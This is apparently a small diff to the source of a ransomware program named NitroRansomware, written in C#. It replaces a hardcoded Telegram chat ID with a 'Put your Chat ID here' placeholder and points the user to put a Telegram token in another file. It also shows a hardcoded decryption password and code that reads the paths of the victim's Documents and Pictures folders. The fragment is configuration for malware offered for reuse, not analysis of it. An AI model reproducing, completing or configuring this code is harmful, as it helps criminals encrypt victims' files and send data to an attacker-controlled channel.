@@ -25,7 +25,7 @@ namespace NitroRansomware
         static string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
         static string pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
 
-        public static string WEBHOOK = "-1001950887599"; //Telegram ChatID here Go to Webhook.cs to put your Telegram Token There
+        public static string WEBHOOK = "Put your Chat ID here"; //Telegram ChatID here Go to Webhook.cs to put your Telegram Token There
         public static string DECRYPT_PASSWORD = "e14a1a875002aa43e3b7869ef81c4f675abfcfa3563a2dbd191d0c96a03a7c75/";
 
         static Logs logging = new Logs("DEBUG", 0);
